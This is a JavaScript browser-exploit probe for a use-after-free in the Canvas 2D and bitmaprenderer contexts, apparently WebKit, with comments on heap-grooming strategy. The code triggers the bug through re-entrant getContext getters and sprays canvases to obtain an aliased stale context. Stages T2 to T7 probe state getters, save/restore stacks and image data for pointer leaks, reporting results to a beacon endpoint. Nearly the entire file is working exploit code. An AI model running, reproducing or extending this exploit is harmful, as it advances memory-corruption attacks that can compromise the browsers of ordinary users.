// p526 — Canvas UAF: out-of-line state buffer reclaim
//
// V525 confirmed:
//   T2: same-type aliased R/W works (idx=5, bidirectional)
//   T3: AB 768B reclaim crashes (m_buffer=null, dereferences null in state())
//
// Strategy: exploit the OUT-OF-LINE state buffer, not the context itself.
//
// When save() is called, m_stateStack grows. Vector growth chain:
//   save 0: capacity 1 (INLINE, 448B in-object) — no malloc
//   save 1: capacity 2 → 896B malloc (class 69)
//   save 2: capacity 3 → 1344B malloc, 896B FREED
//   save 3: capacity 4 → 1792B malloc, 1344B FREED
//
// The trick: save() twice to grow to cap 3 (1344B), freeing the 896B buffer.
// AB spray at 896B reclaims the freed buffer.
// Then restore() once — size goes from 3 to 2. m_buffer still points to 1344B buffer.
// The FREED 896B buffer has our AB data. But m_stateStack doesn't point there anymore.
//
// Better approach: save() once → cap 2 (896B). Write markers.
// The CONTEXT gets freed (by outer getContext overwrite).
// The context's m_stateStack.m_buffer points to the 896B buffer.
// The 896B buffer is NOT freed (it's owned by the context, freed when context destructs).
// Actually — when context is freed, its destructor frees the stateStack too.
// So both the 768B context AND the 896B state buffer get freed.
//
// Revised plan:
//   T1: Get aliased pair via same-type spray (CONFIRMED works)
//   T2: Through aliased pair, save() to push state out-of-line (896B)
//       Set lineWidth to marker. The marker is now in the 896B buffer.
//   T3: Detach the spray context that holds the alias — free both 768B + 896B
//       AB spray at 896B to reclaim state buffer
//       Read lineWidth through stale wrapper → reads from 896B (our AB)
//   T4: setLineDash through stale wrapper → allocates new Vector<double> in heap
//       The Vector header (m_buffer pointer) is written into the 896B slot
//       Read it from the AB → heap address leak
//   T5: Alternative — try getTransform, font, shadowColor for pointer-bearing reads
//
// Problem: detaching the spray context also frees the 768B context slot.
// After that, m_stateStack in the freed 768B context is corrupt (zero or reused).
// So lineWidth can't go through m_stateStack anymore.
//
// ACTUAL working approach (from mja00's analysis):
//   The aliased pair IS the working primitive. We need to leak a pointer
//   through the API. Explore every state getter for pointer-bearing data.
//
// Beacon prefix: V526-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V526-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // Helper: extract raw bytes from a float64
  var rawBuf = new ArrayBuffer(8);
  var rawF64 = new Float64Array(rawBuf);
  var rawU8 = new Uint8Array(rawBuf);
  function floatToHex(f) {
    rawF64[0] = f;
    var h = '';
    for (var i = 7; i >= 0; i--) h += ('0' + rawU8[i].toString(16)).slice(-2);
    return h;
  }

  // T1: Establish aliased pair
  var innerCtx, outerCtx, canvas1;
  var sprayC = [], sprayX = [];
  try {
    canvas1 = document.createElement('canvas');
    canvas1.width = 300; canvas1.height = 150;
    document.body.appendChild(canvas1);

    outerCtx = canvas1.getContext('2d', {
      get desynchronized() {
        innerCtx = canvas1.getContext('2d');
        return false;
      }
    });

    if (!innerCtx) { B('T1-DEAD', 'null'); return; }
    B('T1-TRIGGERED', 'ok');

    for (var i = 0; i < 200; i++) {
      var sc = document.createElement('canvas');
      sc.width = 1; sc.height = 1;
      var sx = sc.getContext('2d');
      if (sx) { sx.lineWidth = 500 + i; sprayC.push(sc); sprayX.push(sx); }
    }

    var lw = innerCtx.lineWidth;
    var aliasIdx = -1;
    for (var i = 0; i < sprayX.length; i++) {
      if (sprayX[i].lineWidth === lw && lw === (500 + i)) { aliasIdx = i; break; }
    }

    if (aliasIdx < 0) { B('T1-NOALIAS', 'lw=' + lw); return; }
    B('T1-ALIAS', 'idx=' + aliasIdx + ' lw=' + lw);
  } catch(e) {
    B('T1-ERR', '' + e);
    return;
  }

  // T2: Dump all readable state fields through the aliased stale wrapper
  // Looking for any value that could be a leaked pointer (non-standard double patterns)
  setTimeout(function() {
    try {
      B('T2-START', 'state field dump');
      var ctx = innerCtx;
      var results = [];

      // Doubles in State
      results.push('lineWidth=' + floatToHex(ctx.lineWidth));
      results.push('miterLimit=' + floatToHex(ctx.miterLimit));
      results.push('shadowOffsetX=' + floatToHex(ctx.shadowOffsetX));
      results.push('shadowOffsetY=' + floatToHex(ctx.shadowOffsetY));
      results.push('shadowBlur=' + floatToHex(ctx.shadowBlur));
      results.push('globalAlpha=' + floatToHex(ctx.globalAlpha));

      B('T2-DOUBLES', results.join(' '));

      // String fields — these go through StringImpl pointers internally
      var strings = [];
      try { strings.push('font=' + ctx.font); } catch(e) { strings.push('font=ERR'); }
      try { strings.push('shadowColor=' + ctx.shadowColor); } catch(e) { strings.push('shadowColor=ERR'); }
      try { strings.push('fillStyle=' + ctx.fillStyle); } catch(e) { strings.push('fillStyle=ERR'); }
      try { strings.push('strokeStyle=' + ctx.strokeStyle); } catch(e) { strings.push('strokeStyle=ERR'); }
      try { strings.push('lineCap=' + ctx.lineCap); } catch(e) { strings.push('lineCap=ERR'); }
      try { strings.push('lineJoin=' + ctx.lineJoin); } catch(e) { strings.push('lineJoin=ERR'); }
      try { strings.push('textAlign=' + ctx.textAlign); } catch(e) { strings.push('textAlign=ERR'); }
      try { strings.push('textBaseline=' + ctx.textBaseline); } catch(e) { strings.push('textBaseline=ERR'); }
      try { strings.push('direction=' + ctx.direction); } catch(e) { strings.push('direction=ERR'); }
      try { strings.push('globalCompositeOp=' + ctx.globalCompositeOperation); } catch(e) { strings.push('gco=ERR'); }

      B('T2-STRINGS', strings.join(' '));

      // getTransform — returns DOMMatrix with 6 doubles
      try {
        var t = ctx.getTransform();
        var transform = [t.a, t.b, t.c, t.d, t.e, t.f].map(floatToHex);
        B('T2-TRANSFORM', transform.join(' '));
      } catch(e) {
        B('T2-TRANSFORM-ERR', '' + e);
      }

      // getLineDash — returns Vector<double> contents
      try {
        var dash = ctx.getLineDash();
        B('T2-DASH', 'length=' + dash.length);
      } catch(e) {
        B('T2-DASH-ERR', '' + e);
      }

      // imageSmoothingQuality
      try {
        B('T2-SMOOTH', 'enabled=' + ctx.imageSmoothingEnabled +
          ' quality=' + ctx.imageSmoothingQuality);
      } catch(e) {
        B('T2-SMOOTH-ERR', '' + e);
      }

      B('T2-DONE', 'field dump complete');
    } catch(e) {
      B('T2-ERR', '' + e);
    }
  }, 2000);

  // T3: save/restore manipulation — grow state vector out-of-line
  // Then read back to see if any raw pointers leak through getLineDash
  setTimeout(function() {
    try {
      B('T3-START', 'save/restore + lineDash probe');

      // Set lineDash through stale wrapper — this allocates Vector<double> in heap
      innerCtx.setLineDash([1.5, 2.5, 3.5, 4.5, 5.5, 6.5, 7.5, 8.5]);
      var dashAfter = innerCtx.getLineDash();
      B('T3-DASHSET', 'length=' + dashAfter.length + ' vals=' +
        Array.prototype.slice.call(dashAfter).join(','));

      // Now save() — state vector grows out-of-line
      innerCtx.save();
      B('T3-SAVED', 'save 1 done');

      // Set different lineWidth + lineDash in the new state
      innerCtx.lineWidth = 42.42;
      innerCtx.setLineDash([11.11, 22.22]);
      var lw = innerCtx.lineWidth;
      var dash2 = innerCtx.getLineDash();
      B('T3-NEWSTATE', 'lw=' + lw + ' dash=' +
        Array.prototype.slice.call(dash2).join(','));

      // save() again — grows to cap 3, frees cap 2 buffer (896B)
      innerCtx.save();
      B('T3-SAVED2', 'save 2 done');

      innerCtx.lineWidth = 99.99;
      var lw2 = innerCtx.lineWidth;
      B('T3-STATE3', 'lw=' + lw2);

      // Restore back
      innerCtx.restore();
      var lwR1 = innerCtx.lineWidth;
      B('T3-RESTORE1', 'lw=' + lwR1);

      innerCtx.restore();
      var lwR2 = innerCtx.lineWidth;
      var dashR2 = innerCtx.getLineDash();
      B('T3-RESTORE2', 'lw=' + lwR2 + ' dash=' +
        Array.prototype.slice.call(dashR2).join(','));

      B('T3-SURVIVED', 'save/restore chain complete');
    } catch(e) {
      B('T3-ERR', '' + e);
    }
  }, 5000);

  // T4: createPattern + createLinearGradient — these store heap objects in State
  // Can we detect pointer artifacts?
  setTimeout(function() {
    try {
      B('T4-START', 'pattern/gradient probe');

      // Create a small canvas for pattern source
      var patCanvas = document.createElement('canvas');
      patCanvas.width = 2; patCanvas.height = 2;
      var patCtx = patCanvas.getContext('2d');
      patCtx.fillStyle = '#ff0000';
      patCtx.fillRect(0, 0, 2, 2);

      // Set pattern as fillStyle through stale wrapper
      try {
        var pattern = innerCtx.createPattern(patCanvas, 'repeat');
        B('T4-PATTERN', 'created=' + !!pattern);
        innerCtx.fillStyle = pattern;
        // Read back fillStyle
        var fs = innerCtx.fillStyle;
        B('T4-FILLSTYLE', 'type=' + typeof fs + ' val=' + fs);
        // Also read through spray alias
        var fsAlias = sprayX[aliasIdx].fillStyle;
        B('T4-FILLSTYLE-ALIAS', 'type=' + typeof fsAlias + ' val=' + fsAlias);
      } catch(e) {
        B('T4-PATTERN-ERR', '' + e);
      }

      // Create gradient
      try {
        var grad = innerCtx.createLinearGradient(0, 0, 100, 100);
        grad.addColorStop(0, '#000000');
        grad.addColorStop(1, '#ffffff');
        innerCtx.fillStyle = grad;
        var fs2 = innerCtx.fillStyle;
        B('T4-GRADIENT', 'type=' + typeof fs2 + ' val=' + fs2);
      } catch(e) {
        B('T4-GRADIENT-ERR', '' + e);
      }

      B('T4-DONE', 'pattern/gradient complete');
    } catch(e) {
      B('T4-ERR', '' + e);
    }
  }, 8000);

  // T5: ImageData probe — write pixels, read back through alias
  // Pixel data lives in a separate buffer; check if we can observe stale reads
  setTimeout(function() {
    try {
      B('T5-START', 'imageData probe');

      // Draw through stale wrapper
      innerCtx.fillStyle = '#FF8800';
      innerCtx.fillRect(0, 0, 10, 10);

      // Read pixels through stale wrapper
      try {
        var id1 = innerCtx.getImageData(0, 0, 4, 4);
        var px = [];
        for (var i = 0; i < 16; i++) px.push(id1.data[i]);
        B('T5-PIXELS-INNER', px.join(','));
      } catch(e) {
        B('T5-PIXELS-INNER-ERR', '' + e);
      }

      // Read pixels through spray alias
      try {
        var id2 = sprayX[aliasIdx].getImageData(0, 0, 4, 4);
        var px2 = [];
        for (var i = 0; i < 16; i++) px2.push(id2.data[i]);
        B('T5-PIXELS-ALIAS', px2.join(','));
      } catch(e) {
        B('T5-PIXELS-ALIAS-ERR', '' + e);
      }

      // putImageData with crafted data through stale, read through alias
      try {
        var craft = innerCtx.createImageData(4, 4);
        for (var i = 0; i < craft.data.length; i++) craft.data[i] = 0xAA;
        innerCtx.putImageData(craft, 50, 50);
        var id3 = sprayX[aliasIdx].getImageData(50, 50, 4, 4);
        var px3 = [];
        for (var i = 0; i < 16; i++) px3.push(id3.data[i]);
        B('T5-PUTIMAGE', px3.join(','));
      } catch(e) {
        B('T5-PUTIMAGE-ERR', '' + e);
      }

      B('T5-DONE', 'imageData probe complete');
    } catch(e) {
      B('T5-ERR', '' + e);
    }
  }, 11000);

  // T6: bitmaprenderer branch — different context type, different UAF surface
  setTimeout(function() {
    try {
      B('T6-START', 'bitmaprenderer UAF');

      var bc = document.createElement('canvas');
      bc.width = 100; bc.height = 100;
      var innerBR;

      var outerBR = bc.getContext('bitmaprenderer', {
        get alpha() {
          innerBR = bc.getContext('bitmaprenderer');
          return true;
        }
      });

      B('T6-TRIGGERED', 'inner=' + !!innerBR + ' outer=' + !!outerBR +
        ' same=' + (innerBR === outerBR));

      // Try transferFromImageBitmap through stale wrapper
      if (innerBR) {
        try {
          // Create ImageBitmap from a canvas
          var srcCanvas = document.createElement('canvas');
          srcCanvas.width = 10; srcCanvas.height = 10;
          var srcCtx = srcCanvas.getContext('2d');
          srcCtx.fillStyle = '#00FF00';
          srcCtx.fillRect(0, 0, 10, 10);

          createImageBitmap(srcCanvas).then(function(bmp) {
            try {
              innerBR.transferFromImageBitmap(bmp);
              B('T6-TRANSFER', 'survived');
            } catch(e) {
              B('T6-TRANSFER-ERR', '' + e);
            }
          }).catch(function(e) {
            B('T6-BITMAP-ERR', '' + e);
          });
        } catch(e) {
          B('T6-SETUP-ERR', '' + e);
        }
      }
    } catch(e) {
      B('T6-ERR', '' + e);
    }
  }, 14000);

  // T7: Save count manipulation — try to trigger m_unrealizedSaveCount path
  // m_unrealizedSaveCount at context+592 (from mja00). save() just increments it.
  // realizeSaves() is called on the NEXT state-modifying operation.
  // If we save() many times without modifying state, unrealizedSaveCount grows
  // but stateStack doesn't. Then one lineWidth set triggers a bulk realize.
  setTimeout(function() {
    try {
      B('T7-START', 'unrealized save stress');

      // 50 saves without any state change
      for (var i = 0; i < 50; i++) {
        innerCtx.save();
      }
      B('T7-SAVED', 'n=50');

      // Now trigger realizeSaves with one lineWidth set
      // This should grow the stateStack from cap 1 to cap >= 51
      // cap chain: 1→2→3→4→6→8→11→14→18→23→29→37→47→59
      // cap 59 * 448B = 26432B = large bmalloc class
      try {
        innerCtx.lineWidth = 7.77;
        B('T7-REALIZED', 'lw=' + innerCtx.lineWidth);
      } catch(e) {
        B('T7-REALIZE-ERR', '' + e);
      }

      // Read lineWidth through alias to confirm it's the same context
      try {
        var aliasLW = sprayX[aliasIdx].lineWidth;
        B('T7-ALIASLW', 'lw=' + aliasLW + ' match=' + (aliasLW === 7.77));
      } catch(e) {
        B('T7-ALIASLW-ERR', '' + e);
      }

      // Now restore all 50 + do a massive GC-pressure pass
      // The restored state entries are "dead" but the out-of-line buffer persists
      for (var i = 0; i < 50; i++) {
        innerCtx.restore();
      }
      var finalLW = innerCtx.lineWidth;
      B('T7-RESTORED', 'lw=' + finalLW);

      B('T7-DONE', 'stress complete');
    } catch(e) {
      B('T7-ERR', '' + e);
    }
  }, 17000);

  setTimeout(function() {
    B('COMPLETE', 'all T1-T7 done');
  }, 20000);

})();
